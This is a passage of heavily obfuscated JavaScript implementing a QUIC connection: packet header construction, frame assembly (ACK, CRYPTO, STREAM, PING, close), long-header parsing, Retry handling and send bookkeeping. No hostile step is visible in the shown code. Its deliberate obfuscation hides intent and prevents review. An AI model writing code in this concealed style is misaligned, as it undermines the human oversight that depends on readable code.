            c[iB(0x359)][iB(0x6da)][iB(0x67e)]([{
                    'start': c[iB(0xd0b)],
                    'length': c['length']
                }]), c[iB(0x1d6)] && c['stream'][iB(0x6da)][iB(0x67e)]([{
                    'start': c[iB(0xd0b)] + c[iB(0xed)],
                    'length': 0x0,
                    'fin': !![]
                }]), this[iB(0x971)](c[iB(0x359)]);
        }
    }
    ['onSendProgress']() {
        const iC = a0ch;
        this['retransmits'] = 0x0, this[iC(0x1f7)] = 0x0;
    }
    ['_discardEpoch'](a, b) {
        const iD = a0ch, c = {
                'QIxrX': function (d, f) {
                    return d === f;
                },
                'oZRfy': function (d, f) {
                    return d + f;
                },
                'lLRYX': iD(0x643)
            };
        if (c[iD(0x95b)](this[iD(0x2a2)][a], null))
            return;
        this[iD(0x2a2)][a] = null, this[iD(0x13f)][a] = [], this[iD(0x215)][iD(0x4f6)](c[iD(0x429)](c[iD(0x429)](c['lLRYX'] + a0bn[a] + iD(0x9ec), b), ')'));
    }
    [a0ch(0x5e7)]() {
        const iE = a0ch, a = {
                'fmVsn': function (k, l) {
                    return k === l;
                },
                'KlycM': function (k, l) {
                    return k(l);
                },
                'iUYNt': function (k, l, m, n, o) {
                    return k(l, m, n, o);
                }
            }, b = a0bl, c = this['keys'][b];
        if (a[iE(0x9ee)](c, null) || !this['ackPending'][b] || this[iE(0x967)][b][iE(0xed)] === 0x0)
            return;
        const d = a[iE(0x1e6)](a0bI, this[iE(0x967)][b][iE(0x88a)](-0x10));
        this[iE(0x9c5)][b] = ![];
        const f = this[iE(0x31a)][b]++, g = this[iE(0x1ba)](b, a0bh + d['length'] + 0x10, f), h = Buffer['concat']([
                g[iE(0x159)],
                g[iE(0xb2a)]
            ]), i = Buffer['concat']([
                h,
                c[iE(0x6da)][iE(0xce7)](f, h, d)
            ]), j = a[iE(0x9f3)](a0bF, c[iE(0x6da)], i, g[iE(0x955)], g[iE(0x645)]);
        if (a[iE(0x9ee)](j, null)) {
            this[iE(0x9c5)][b] = !![];
            return;
        }
        this[iE(0x20c)]({
            'epoch': b,
            'packet': j,
            'pn': f,
            'meta': {
                'crypto': null,
                'streams': []
            },
            'ackEliciting': ![]
        });
    }
    [a0ch(0x46e)]() {
        const iF = a0ch, a = { 'FPoDA': iF(0xb2d) };
        if (this[iF(0x992)] || !this['handshakeComplete'] || !this[iF(0xc92)])
            return;
        this[iF(0x5e7)](), this[iF(0x992)] = !![], this[iF(0x203)](a0bl, iF(0xb2d)), this[iF(0x203)](a0bk, a[iF(0x420)]);
    }
    ['_headerOverhead'](a) {
        const iG = a0ch, b = {
                'jrkss': function (d, f) {
                    return d === f;
                },
                'XUFii': function (d, f) {
                    return d + f;
                },
                'VIvby': function (d, f) {
                    return d === f;
                },
                'WCpJV': function (d, f) {
                    return d + f;
                },
                'wtcVc': function (d, f) {
                    return d + f;
                },
                'elYmk': function (d, f) {
                    return d + f;
                },
                'qxibI': function (d, f) {
                    return d + f;
                },
                'fyqoY': function (d, f) {
                    return d + f;
                },
                'WPiwV': function (d, f) {
                    return d(f);
                }
            }, c = 0x10;
        if (b['jrkss'](a, a0bm))
            return b[iG(0x3b8)](b['XUFii'](b[iG(0x3b8)](0x1, this[iG(0x458)][iG(0xed)]), a0bh), c);
        if (b['VIvby'](a, a0bl))
            return b[iG(0x3b8)](b[iG(0x3b8)](b[iG(0xaea)](b[iG(0x69d)](b[iG(0x3b8)](b[iG(0x69d)](0x1 + 0x4, 0x1) + this[iG(0x458)]['length'], 0x1), this[iG(0x4bc)]['length']), 0x2), a0bh), c);
        return b[iG(0xb67)](b[iG(0x69d)](b['qxibI'](b[iG(0xc94)](b[iG(0x3b8)](b[iG(0x3f4)](b[iG(0x3b8)](0x1, 0x4), 0x1), this[iG(0x458)][iG(0xed)]), 0x1), this['ourCid']['length']) + b[iG(0xd23)](a0bq, this['peerToken'][iG(0xed)]), this[iG(0xd55)]['length']) + 0x2, a0bh) + c;
    }
    [a0ch(0x1ba)](a, b, c) {
        const iH = a0ch, d = {
                'tvRXr': function (k, l) {
                    return k >>> l;
                },
                'wiuAv': function (k, l) {
                    return k === l;
                },
                'lTToV': function (k, l) {
                    return k | l;
                },
                'KJkFS': function (k, l) {
                    return k << l;
                },
                'KbDiR': function (k, l) {
                    return k + l;
                },
                'uYZju': function (k, l) {
                    return k === l;
                },
                'zNmPz': function (k, l) {
                    return k | l;
                },
                'gYuYD': function (k, l) {
                    return k - l;
                },
                'bUGWe': function (k, l) {
                    return k === l;
                },
                'zPKKU': function (k, l) {
                    return k | l;
                }
            }, f = new a0bt(), g = Buffer[iH(0x9e7)](a0bh);
        g[iH(0x295)](d[iH(0xbac)](c, 0x0), 0x0);
        if (d[iH(0x2ae)](a, a0bm))
            return f[iH(0x4a0)](d[iH(0x533)](0x40, d[iH(0x9ef)](this['appKeyPhase'], 0x2)) | a0bh - 0x1), f[iH(0x717)](this[iH(0x458)]), {
                'header': f[iH(0x14c)](),
                'pnBytes': g,
                'pnOffset': d[iH(0x676)](0x1, this['peerCid'][iH(0xed)]),
                'long': ![]
            };
        const h = d[iH(0xa8c)](a, a0bk) ? 0x0 : 0x2;
        f[iH(0x4a0)](d[iH(0x533)](d['zNmPz'](0xc0, d['KJkFS'](h, 0x4)), d['gYuYD'](a0bh, 0x1))), f[iH(0x629)](a0bb), f[iH(0x4a0)](this[iH(0x458)]['length'])[iH(0x717)](this[iH(0x458)]);
        d[iH(0x8db)](a, a0bk) ? (f[iH(0x4a0)](this[iH(0x4bc)][iH(0xed)])[iH(0x717)](this['ourCid']), f[iH(0x2d2)](this['peerToken'][iH(0xed)]), this[iH(0xd55)][iH(0xed)] && f[iH(0x717)](this[iH(0xd55)])) : f[iH(0x4a0)](0x0)[iH(0x717)](Buffer[iH(0x9e7)](0x0));
        const i = Buffer[iH(0x9e7)](0x2);
        i[iH(0xb21)](d[iH(0x8af)](0x4000, b), 0x0), f[iH(0x717)](i);
        const j = f['build']();
        return {
            'header': j,
            'pnBytes': g,
            'pnOffset': j['length'],
            'long': !![]
        };
    }
    [a0ch(0x8c8)]() {
        const iI = a0ch, a = {
                'ehcfI': function (b, c) {
                    return b === c;
                }
            };
        for (const b of [
                a0bk,
                a0bl,
                a0bm
            ]) {
            if (this[iI(0x2a2)][b] === null)
                continue;
            if (this[iI(0x9c5)][b] && this[iI(0x967)][b][iI(0xed)])
                return b;
            if (this[iI(0x5b5)](b)[iI(0xed)])
                return b;
            if (this[iI(0x7ff)][b][iI(0x19b)][iI(0xed)])
                return b;
            if (a['ehcfI'](b, a0bm) && (this[iI(0x1f6)]['length'] || this[iI(0x669)]['length'] || this[iI(0xb68)] || this[iI(0x1b6)]))
                return b;
        }
        return -0x1;
    }
    ['_pendingOneOff'](a) {
        const iJ = a0ch;
        return this[iJ(0x240)]['filter'](b => b[iJ(0xaf9)] === a);
    }
    [a0ch(0x715)]() {
        const iK = a0ch, a = {
                'ffNBV': function (o, p) {
                    return o < p;
                },
                'OuhSt': function (o, p) {
                    return o - p;
                },
                'DQhrm': function (o, p) {
                    return o(p);
                },
                'qqnjE': function (o, p) {
                    return o > p;
                },
                'XfTVT': function (o, p) {
                    return o - p;
                },
                'EAPPe': function (o, p) {
                    return o - p;
                },
                'DBElS': function (o, p) {
                    return o === p;
                },
                'aevQz': function (o, p) {
                    return o - p;
                },
                'ohAdz': function (o, p) {
                    return o === p;
                },
                'TmnIG': function (o, p) {
                    return o > p;
                },
                'keNOw': function (o, p) {
                    return o === p;
                },
                'GofSM': function (o, p) {
                    return o + p;
                },
                'lXEze': function (o, p, q, r, s) {
                    return o(p, q, r, s);
                },
                'yhXuy': function (o, p) {
                    return o === p;
                },
                'nGolI': iK(0x966)
            }, b = this['_pickEpoch']();
        if (a[iK(0x24e)](b, 0x0))
            return null;
        let c = a[iK(0xc8a)](this[iK(0xd64)], this['_headerOverhead'](b));
        if (a[iK(0x24e)](c, 0x10))
            return null;
        const d = [], f = {
                'crypto': null,
                'streams': [],
                'ping': ![],
                'closing': ![],
                'oneOff': ![]
            };
        if (this['ackPending'][b] && this[iK(0x967)][b][iK(0xed)]) {
            const o = a[iK(0x7fc)](a0bI, this[iK(0x967)][b][iK(0x88a)](-0x10));
            d['push'](o), c -= o[iK(0xed)], this[iK(0x9c5)][b] = ![];
        }
        for (const p of this[iK(0x5b5)](b)) {
            if (a['qqnjE'](p[iK(0x150)][iK(0xed)], a[iK(0xc4d)](c, 0x10)))
                break;
            d['push'](p[iK(0x150)]), c -= p[iK(0x150)][iK(0xed)], this[iK(0x240)][iK(0x67f)](this[iK(0x240)][iK(0xfa)](p), 0x1), f[iK(0x7bc)] = !![];
        }
        const g = this[iK(0x7ff)][b];
        if (g[iK(0x19b)]['length'] && a[iK(0x3fe)](c, 0x10)) {
            const q = g['take'](a[iK(0x299)](c, 0xc)), r = new a0bt();
            r[iK(0x4a0)](a0bo[iK(0xcac)])[iK(0x2d2)](q[iK(0xd0b)])[iK(0x2d2)](q[iK(0xed)])[iK(0x717)](q[iK(0x717)]);
            const s = r[iK(0x14c)]();
            d[iK(0x77f)](s), c -= s[iK(0xed)], f[iK(0xcac)] = q;
        }
        a[iK(0xae6)](b, a0bm) && (this[iK(0x9c8)](d, f, c), this[iK(0xcd0)](d, f, Math[iK(0x2dc)](c, a['aevQz'](this[iK(0xbab)](), this['_inFlightBytes']()))));
        if (a['ohAdz'](b, a0bm) && this['closing']) {
            const t = new a0bt();
            t[iK(0x4a0)](a0bo['applicationClose'])['varint'](0x0)['varint'](0x0)[iK(0x717)](Buffer[iK(0x8c2)](this['closeReason'] || 'close', 'utf8')[iK(0x4b4)](0x0, 0x40)), d['push'](t[iK(0x14c)]()), f[iK(0x1b6)] = !![];
        } else
            a[iK(0xae6)](b, a0bm) && this[iK(0xb68)] && (d[iK(0x77f)](Buffer['from']([a0bo[iK(0xc6a)]])), this['pingPending'] = ![], f[iK(0xc6a)] = !![]);
        if (!d[iK(0xed)])
            return null;
        let h = Buffer[iK(0x653)](d);
        if (a[iK(0x491)](b, a0bk) && !this[iK(0x691)]) {
            const u = a[iK(0x299)](a[iK(0xc4d)](a0bj, this[iK(0x476)](b)), h['length']);
            a[iK(0x16b)](u, 0x0) && (h = Buffer['concat']([
                h,
                Buffer[iK(0x9e7)](u)
            ]));
        }
        const i = this[iK(0x31a)][b]++, j = a['keNOw'](b, a0bm) ? this[iK(0x661)][this[iK(0x688)]] : this[iK(0x2a2)][b][iK(0x6da)], k = this[iK(0x1ba)](b, a[iK(0x19d)](a0bh, h[iK(0xed)]) + 0x10, i), l = Buffer[iK(0x653)]([
                k[iK(0x159)],
                k[iK(0xb2a)]
            ]), m = Buffer[iK(0x653)]([
                l,
                j[iK(0xce7)](i, l, h)
            ]), n = a[iK(0xadb)](a0bF, j, m, k[iK(0x955)], k[iK(0x645)]);
        if (a['yhXuy'](n, null))
            return this[iK(0xc49)](a['nGolI']), null;
        return {
            'epoch': b,
            'packet': n,
            'pn': i,
            'meta': f,
            'ackEliciting': a[iK(0x7fc)](Boolean, f[iK(0xcac)] || f[iK(0x4b0)][iK(0xed)] || f['ping'] || f[iK(0x1b6)] || f[iK(0x7bc)]),
            'summary': this['_frameSummary'](d)
        };
    }
    [a0ch(0xae8)](a) {
        const iL = a0ch, b = {
                'Mlnax': function (d, f) {
                    return d === f;
                },
                'pPPIU': iL(0xbc2),
                'DJSJz': 'crypto',
                'BjJRC': function (d, f) {
                    return d === f;
                },
                'wRHPy': iL(0x97d),
                'LCdoy': 'path-response',
                'aAhFq': function (d, f) {
                    return d + f;
                }
            }, c = [];
        for (const d of a) {
            const f = d[0x0];
            if (b[iL(0x1a1)](f, a0bo[iL(0xbc2)]))
                c['push'](b[iL(0xae7)]);
            else {
                if (f === a0bo['crypto'])
                    c[iL(0x77f)](b[iL(0x4fc)]);
                else {
                    if (f === a0bo['ping'])
                        c[iL(0x77f)](iL(0xc6a));
                    else {
                        if (b[iL(0x1ae)](f, a0bo[iL(0x359)]))
                            c['push'](iL(0x359));
                        else {
                            if (b[iL(0x1ae)](f, a0bo[iL(0x5af)]))
                                c[iL(0x77f)](b[iL(0x4fb)]);
                            else {
                                if (b[iL(0x1a1)](f, a0bo[iL(0x724)]))
                                    c['push'](iL(0x26e));
                                else
                                    f === a0bo['pathResponse'] ? c[iL(0x77f)](b[iL(0xfd)]) : c[iL(0x77f)](b[iL(0xa2e)]('0x', f[iL(0x1d9)](0x10)));
                            }
                        }
                    }
                }
            }
        }
        return c[iL(0xaa7)](',');
    }
    [a0ch(0x9c8)](a, b, c) {
        const iM = a0ch, d = {
                'fWNqg': function (f, g) {
                    return f - g;
                }
            };
        if (this[iM(0xb96)] && c > 0xc) {
            const f = new a0bt();
            f['byte'](a0bo[iM(0x5af)])[iM(0x2d2)](this[iM(0x99a)]), a[iM(0x77f)](f['build']()), this['creditMaxData'] = ![], c -= a[d['fWNqg'](a[iM(0xed)], 0x1)]['length'];
        }
        for (const g of this['creditReady'][iM(0x88a)]()) {
            if (c < 0x14)
                break;
            const h = new a0bt();
            h[iM(0x4a0)](a0bo[iM(0x724)])['varint'](g['id'])[iM(0x2d2)](g[iM(0x88b)]);
            const i = h[iM(0x14c)]();
            a['push'](i), c -= i[iM(0xed)];
            const j = this['creditReady'][iM(0xfa)](g);
            this[iM(0x669)][iM(0x67f)](j, 0x1);
        }
    }
    [a0ch(0x526)](a) {
        const iN = a0ch, b = {
                'BlDyI': function (c, d) {
                    return c === d;
                },
                'bjbWf': iN(0x3dd)
            };
        if (a['peerLimit'])
            return a[iN(0x4ec)];
        return b[iN(0xa53)](a[iN(0xb5f)], b[iN(0x6ed)]) ? this[iN(0x41c)] : this[iN(0x69b)];
    }
    [a0ch(0xcd0)](a, b, c) {
        const iO = a0ch, d = {
                'xYdTQ': function (f, g) {
                    return f < g;
                },
                'YDNCR': function (f, g) {
                    return f - g;
                },
                'YWEyF': function (f, g) {
                    return f === g;
                },
                'BGVLn': function (f, g) {
                    return f | g;
                },
                'xMVYn': function (f, g) {
                    return f | g;
                },
                'qTuIO': function (f, g) {
                    return f + g;
                },
                'tPKjo': function (f, g) {
                    return f | g;
                }
            };
        for (const f of this['sendReady']['slice']()) {
            if (d['xYdTQ'](c, 0x18))
                break;
            const g = Math[iO(0x2dc)](d['YDNCR'](this[iO(0xc78)], this[iO(0xa2f)]), this['_peerStreamLimit'](f) - f[iO(0x2e1)]);
            if (g <= 0x0)
                break;
            const h = f[iO(0x6da)][iO(0x9d8)](Math[iO(0x2dc)](d[iO(0x9de)](c, 0x14), g));
            if (d[iO(0x23f)](h, null)) {
                if (f[iO(0x6da)]['takeFin']()) {
                    const n = new a0bt();
                    n[iO(0x4a0)](d[iO(0x7e6)](d['xMVYn'](a0bo[iO(0x359)], 0x4) | 0x2, 0x1))['varint'](f['id'])[iO(0x2d2)](f['send'][iO(0x649)]['length'])[iO(0x2d2)](0x0);
                    const o = n['build']();
                    a[iO(0x77f)](o), c -= o['length'], b[iO(0x4b0)][iO(0x77f)]({
                        'stream': f,
                        'start': f[iO(0x6da)]['data'][iO(0xed)],
                        'length': 0x0,
                        'fin': !![]
                    });
                } else
                    this[iO(0x337)](f);
                continue;
            }
            const i = d['qTuIO'](h[iO(0xd0b)], h[iO(0xed)]) >= f[iO(0x6da)][iO(0x649)][iO(0xed)], j = d[iO(0x6e1)](0x4 | 0x2, i && f['send'][iO(0x1d6)] ? 0x1 : 0x0), k = new a0bt();
            k[iO(0x4a0)](d[iO(0x945)](a0bo[iO(0x359)], j))[iO(0x2d2)](f['id'])[iO(0x2d2)](h[iO(0xd0b)])[iO(0x2d2)](h['length'])['bytes'](h[iO(0x717)]);
            const l = k[iO(0x14c)]();
            a['push'](l), c -= l['length'], b[iO(0x4b0)][iO(0x77f)]({
                'stream': f,
                'start': h['start'],
                'length': h[iO(0xed)],
                'fin': i && f[iO(0x6da)]['fin'],
                'retransmitted': h[iO(0xd4f)]
            });
            const m = Math['max'](0x0, d[iO(0x37a)](h['start'], h[iO(0xed)]) - f[iO(0x2e1)]);
            f['sentEnd'] = Math['max'](f[iO(0x2e1)], d['qTuIO'](h[iO(0xd0b)], h[iO(0xed)])), this[iO(0xa2f)] += m, f[iO(0x6da)][iO(0x186)]() && this[iO(0x337)](f);
        }
    }
    [a0ch(0x337)](a) {
        const iP = a0ch, b = {
                'coXdV': function (d, f) {
                    return d >= f;
                }
            }, c = this['sendReady'][iP(0xfa)](a);
        b[iP(0x176)](c, 0x0) && this[iP(0x1f6)]['splice'](c, 0x1);
    }
    ['markSendReady'](a) {
        const iQ = a0ch, b = {
                'Tyfvn': function (c, d) {
                    return c < d;
                }
            };
        b['Tyfvn'](this['sendReady'][iQ(0xfa)](a), 0x0) && this[iQ(0x1f6)]['push'](a);
    }
    [a0ch(0xb06)]() {
        const iR = a0ch, a = new a0bQ(this, this['nextLocalStream'], iR(0x3dd));
        return this[iR(0xa47)] += 0x4, this[iR(0x4b0)][iR(0xb80)](a['id'], a), a;
    }
    async [a0ch(0x2c9)](a, b, c) {
        const iS = a0ch, d = {
                'JUspU': function (g, h) {
                    return g === h;
                },
                'vUOob': function (g, h) {
                    return g + h;
                }
            }, f = this['streams'][iS(0x850)](a);
        if (d['JUspU'](f, undefined))
            throw new Error(d[iS(0x9f7)]('unknown\x20stream\x20', a));
        f[iS(0x92a)](b, c);
    }
    [a0ch(0x20c)](a) {
        const iT = a0ch, b = {
                'oVUTV': iT(0x738),
                'iarnq': function (c, d) {
                    return c === d;
                },
                'UOiaY': function (c, d) {
                    return c <= d;
                },
                'lbDxH': function (c, d) {
                    return c + d;
                },
                'mSlHt': function (c, d) {
                    return c + d;
                },
                'pRexd': iT(0xc3e),
                'JlTLQ': iT(0x26f),
                'hUYXa': function (c, d) {
                    return c === d;
                },
                'gcYxX': function (c, d) {
                    return c === d;
                },
                'QHwYI': function (c, d) {
                    return c + d;
                },
                'vjdWO': iT(0x63a)
            };
        if (b[iT(0x502)](this['socket'], null) || this[iT(0xb41)])
            return;
        this['socket'][iT(0x6da)](a[iT(0x637)], 0x0, a[iT(0x637)][iT(0xed)], this[iT(0xae3)], this[iT(0xab4)], c => {
            const iU = iT;
            c && !this['closed'] && this[iU(0x215)][iU(0x4f6)](b[iU(0x7af)] + c[iU(0x8f9)]);
        });
        if (process.env.KISAMA_QUIC_DEBUG && b[iT(0x502)](a['epoch'], 0x1) && b[iT(0x673)](this[iT(0xca4)]['tx'], 0x28))
            this['log']['warning'](b[iT(0xb08)](b[iT(0xcab)](b[iT(0xcab)](iT(0x80b), a['pn']), b[iT(0x4e5)]), a[iT(0x637)][iT(0x1d9)](b[iT(0x1b2)])));
        this[iT(0xca4)]['tx'] += 0x1, this[iT(0xca4)][iT(0xa34)] += a[iT(0x637)][iT(0xed)];
        b['hUYXa'](a[iT(0xaf9)], a0bk) && (this[iT(0x804)] += 0x1);
        b[iT(0xc7e)](a[iT(0xaf9)], a0bl) && b['iarnq'](this[iT(0x7ff)][a0bl][iT(0x19b)][iT(0xed)], 0x0) && (this[iT(0xc92)] = !![]);
        this['log']['debug'](b['QHwYI'](b['QHwYI'](b[iT(0xb08)](b[iT(0xb08)](b[iT(0xa30)] + a[iT(0x637)][iT(0xed)] + 'B\x20' + a0bn[a[iT(0xaf9)]] + iT(0x735), a['pn']), '\x20['), a['summary']), ']'));
        if (a[iT(0x721)]) {
            const c = a[iT(0x9d2)][iT(0xcac)] !== null && a['meta']['crypto'][iT(0xd4f)] === !![] || a[iT(0x9d2)][iT(0x4b0)][iT(0xb7b)](d => d[iT(0xd4f)] === !![]);
            this[iT(0x13f)][a[iT(0xaf9)]][iT(0x77f)]({
                'pn': a['pn'],
                'time': Date['now'](),
                'bytes': a[iT(0x637)][iT(0xed)],
                'crypto': a[iT(0x9d2)][iT(0xcac)],
                'streams': a[iT(0x9d2)][iT(0x4b0)],
                'retransmitted': c
            }), this[iT(0x362)] = Date[iT(0x156)]();
        }
    }
    [a0ch(0xac0)](a) {
        const iV = a0ch, b = {
                'CwWMC': function (d, f) {
                    return d < f;
                },
                'iaTEk': function (d, f) {
                    return d & f;
                },
                'iviDg': function (d, f) {
                    return d === f;
                },
                'xMUod': function (d, f) {
                    return d !== f;
                },
                'LKXhQ': function (d, f) {
                    return d + f;
                },
                'vrgSJ': function (d, f) {
                    return d + f;
                }
            };
        this['stats']['rx'] += 0x1, this[iV(0xca4)][iV(0x975)] += a[iV(0xed)], this[iV(0x78d)] = Date[iV(0x156)]();
        let c = 0x0;
        while (b[iV(0x80e)](c, a[iV(0xed)])) {
            const d = a[c];
            if (!b[iV(0xbe1)](d, 0x80)) {
                this['_handleShort'](a[iV(0x4b4)](c));
                return;
            }
            const f = a[iV(0x4b4)](c), g = this['_parseLong'](f, 0x0);
            if (b['iviDg'](g, null))
                return;
            if (b[iV(0xd34)](g[iV(0xa8d)], a0bb)) {
                this[iV(0x215)][iV(0x4f6)](b[iV(0x290)](iV(0xbb5), g[iV(0xa8d)][iV(0x1d9)](0x10)));
                return;
            }
            if (b['iviDg'](g[iV(0x430)], 0x3)) {
                this[iV(0xc4a)](g);
                return;
            }
            const h = Math[iV(0x2dc)](f[iV(0xed)], b['vrgSJ'](g['pnOffset'], g[iV(0xed)]));
            this['_handleLong'](f[iV(0x4b4)](0x0, h), g), c += h;
        }
    }
    [a0ch(0x7d6)](a, b) {
        const iW = a0ch, c = {
                'GVbIt': function (o, p) {
                    return o < p;
                },
                'EUXzu': function (o, p) {
                    return o - p;
                },
                'WDxZd': function (o, p) {
                    return o + p;
                },
                'APHty': function (o, p) {
                    return o + p;
                },
                'iHphr': function (o, p) {
                    return o + p;
                },
                'xeJQw': function (o, p) {
                    return o === p;
                },
                'KtIVm': function (o, p, q) {
                    return o(p, q);
                },
                'UqjSZ': function (o, p) {
                    return o === p;
                },
                'IUMub': function (o, p) {
                    return o(p);
                },
                'tJZuI': function (o, p) {
                    return o < p;
                },
                'YamTf': function (o, p) {
                    return o - p;
                },
                'CZKbb': function (o, p) {
                    return o - p;
                },
                'iuTIj': function (o, p, q) {
                    return o(p, q);
                },
                'elgjU': function (o, p) {
                    return o === p;
                }
            };
        if (c[iW(0xa07)](c[iW(0x145)](a[iW(0xed)], b), 0x7))
            return null;
        const d = a[b], f = a['readUInt32BE'](b + 0x1), g = (d & 0x30) >> 0x4;
        let h = c[iW(0x4a1)](b, 0x5);
        const i = a[h];
        h += 0x1;
        if (c[iW(0xa07)](a[iW(0xed)] - h, c['WDxZd'](i, 0x1)))
            return null;
        const j = a[iW(0x4b4)](h, c['APHty'](h, i));
        h += i;
        const k = a[h];
        h += 0x1;
        if (c[iW(0xa07)](a[iW(0xed)] - h, k))
            return null;
        const l = a[iW(0x4b4)](h, c[iW(0xc58)](h, k));
        h += k;
        let m = Buffer[iW(0x9e7)](0x0);
        if (c[iW(0x964)](g, 0x0)) {
            const o = c[iW(0x906)](a0bs, a, h);
            if (c[iW(0x26c)](o, null))
                return null;
            h += o[0x1];
            const p = c[iW(0x4a5)](Number, o[0x0]);
            if (c[iW(0x73c)](c[iW(0x1fd)](a[iW(0xed)], h), p))
                return null;
            m = a[iW(0x4b4)](h, h + p), h += p;
        }
        if (c['UqjSZ'](g, 0x3))
            return {
                'first': d,
                'type': g,
                'version': f,
                'dcid': j,
                'scid': l,
                'token': a['subarray'](h, c[iW(0x5a1)](a[iW(0xed)], 0x10)),
                'pnOffset': 0x0,
                'length': 0x0,
                'retry': !![]
            };
        const n = c[iW(0xb0e)](a0bs, a, h);
        if (c[iW(0x930)](n, null))
            return null;
        return h += n[0x1], {
            'first': d,
            'type': g,
            'version': f,
            'dcid': j,
            'scid': l,
            'token': m,
            'pnOffset': h,
            'length': c[iW(0x4a5)](Number, n[0x0]),
            'retry': ![]
        };
    }
    [a0ch(0xc4a)](a) {
        const iX = a0ch, b = {
                'vyxIN': function (f, g) {
                    return f + g;
                },
                'kdnvM': function (f, g) {
                    return f + g;
                },
                'UViNc': iX(0x265),
                'dNGWf': iX(0x537),
                'CktMx': iX(0x26f)
            }, c = iX(0xb63)[iX(0xbb0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[iX(0x215)][iX(0x4f6)](b[iX(0xc71)](b[iX(0xd2f)](b[iX(0xc71)](b[iX(0x50e)], a[iX(0x313)][iX(0xed)]), b[iX(0x87a)]), a['scid'][iX(0x1d9)](b[iX(0x256)])));
                continue;
            case '1':
                this[iX(0x7ff)][a0bk][iX(0xba6)]();
                continue;
            case '2':
                this[iX(0x13f)][a0bk] = [];
                continue;
            case '3':
                this['pnSend'][a0bk] = 0x0;
                continue;
            case '4':
                this[iX(0x804)] = 0x0;
                continue;
            case '5':
                this['peerCid'] = Buffer[iX(0x8c2)](a[iX(0x89e)]);
                continue;
            case '6':
                this[iX(0xd55)] = Buffer[iX(0x8c2)](a[iX(0x313)]);
                continue;
            }
            break;
        }
    }
    ['_epochForType'](a) {
        const iY = a0ch, b = {
                'CVWhc': function (c, d) {
                    return c === d;
                }
            };
        if (b[iY(0x342)](a, 0x0) || a === 0x1)
            return a0bk;
        return a0bl;
    }
    ['_handleLong'](a, b) {
        const iZ = a0ch, c = {
                'QhiVQ': function (m, n) {
                    return m === n;
                },
                'MeVwx': function (m, n) {
                    return m < n;
                },
                'pCWre': function (m, n, o, p, q) {
                    return m(n, o, p, q);
                },
                'Uctob': function (m, n) {
                    return m + n;
                },
                'dCtZS': function (m, n) {
                    return m & n;
                },
                'CAChF': function (m, n) {
                    return m * n;
                },
                'wTbHO': function (m, n) {
                    return m + n;
                },
                'mNCKl': function (m, n) {
                    return m + n;
                },
                'dTUnO': iZ(0x5c7),
                'vWDpZ': function (m, n) {
                    return m === n;
                },
                'bzSOJ': iZ(0xb5b),
                'lOTBQ': iZ(0x26f),
                'AFwCu': function (m, n) {
                    return m + n;
                },
                'nNbuO': function (m, n) {
                    return m + n;
                },
                'ErLIW': function (m, n) {
                    return m + n;
                },
                'baPaB': iZ(0x735),
                'iwumW': function (m, n) {
                    return m === n;
                }
            }, d = this[iZ(0x85c)](b[iZ(0x430)]), f = this[iZ(0x2a2)][d];
        if (c[iZ(0x332)](f, null)) {
            this[iZ(0xca4)][iZ(0xc9a)] += 0x1;
            return;
        }
        if (c[iZ(0x470)](b[iZ(0xed)], a0bh)) {
            this['stats']['dropped'] += 0x1;
            return;
        }
        const g = c[iZ(0x9e4)](a0bG, f['recv'], a, b[iZ(0x955)], !![]);
        if (g === null) {
            this['stats'][iZ(0xc9a)] += 0x1;
            return;
        }
        const [h, i] = g, j = c[iZ(0x3b2)](c[iZ(0x231)](h[0x0], 0x3), 0x1), k = a0bH(Math[iZ(0x434)](this[iZ(0xab3)][d], 0x0), c[iZ(0x503)](j, 0x8), i);
        let l;
        try {
            l = f[iZ(0x23d)][iZ(0x7c1)](k, h, a[iZ(0x4b4)](c['Uctob'](b['pnOffset'], j)));
        } catch (m) {
            this['stats']['dropped'] += 0x1, this[iZ(0x215)][iZ(0x4f6)](c[iZ(0x734)](c[iZ(0x734)](c['Uctob'](c['mNCKl'](c['dTUnO'], a[iZ(0xed)]), 'B\x20'), a0bn[d]), iZ(0x65f)));
            return;
        }
        c[iZ(0x92d)](d, a0bk) && c[iZ(0x332)](b[iZ(0xb2e)][iZ(0xed)], this[iZ(0x4bc)][iZ(0xed)]) && b[iZ(0xb2e)][iZ(0x45b)](this[iZ(0x4bc)]) && (!this[iZ(0x691)] && b[iZ(0x89e)]['length'] && !this[iZ(0x458)][iZ(0x45b)](b[iZ(0x89e)]) && (this[iZ(0x458)] = Buffer[iZ(0x8c2)](b['scid']), this[iZ(0x215)][iZ(0x4f6)](c[iZ(0x1e1)](c[iZ(0x974)], this[iZ(0x458)][iZ(0x1d9)](c[iZ(0x73b)]))))), this[iZ(0xab0)](d, k), this[iZ(0x215)][iZ(0x4f6)](c['AFwCu'](c[iZ(0x734)](c[iZ(0x603)](c[iZ(0x836)](iZ(0x5c7), a[iZ(0xed)]), 'B\x20'), a0bn[d]) + c[iZ(0x59c)], k)), c['iwumW'](d, a0bl) && this[iZ(0x203)](a0bk, 'handshake\x20packet\x20received'), this[iZ(0xb23)](l, d);
    }
    [a0ch(0x198)](a) {
        const j0 = a0ch, b = {
                'jOmGs': function (i, j) {
                    return i === j;
                },
                'XKvem': function (i, j) {
                    return i + j;
                },
                'Lndjf': j0(0x5c7),
                'GCczf': function (i, j) {
                    return i < j;
                },
                'bnJtu': function (i, j) {
                    return i(j);
                },
                'eqtNc': function (i, j, k, l, m) {
                    return i(j, k, l, m);
                },
                'tfiRi': function (i, j) {
                    return i & j;
                },
                'YYYQl': function (i, j, k, l) {
                    return i(j, k, l);
                },
                'piclI': function (i, j) {
                    return i + j;
                },
                'HOAwT': '2|0|4|3|1',
                'pCwFN': function (i, j) {
                    return i > j;
                },
                'PunKL': function (i, j) {
                    return i + j;
                },
                'IrnQk': j0(0x162),
                'ecUHF': function (i, j, k) {
                    return i(j, k);
                },
                'beWvx': function (i, j) {
                    return i - j;
                },
                'YQJAM': function (i, j) {
                    return i + j;
                },
                'eksCI': j0(0x62b),
                'VVcpB': function (i, j) {
                    return i + j;
                }
            }, c = this['keys'][a0bm];
        if (b['jOmGs'](c, null)) {
            this[j0(0xca4)][j0(0xc9a)] += 0x1, this[j0(0x215)][j0(0x4f6)](b['XKvem'](b[j0(0x9fa)](b[j0(0x557)], a[j0(0xed)]), j0(0xd2d)));
            return;
        }
        b[j0(0x169)](this[j0(0xb0b)]['length'], 0x0) && this[j0(0xb0b)][j0(0x77f)]({
            'keys': c[j0(0x23d)],
            'phase': 0x0
        });
        const d = 0x1 + this['ourCid'][j0(0xed)], f = [];
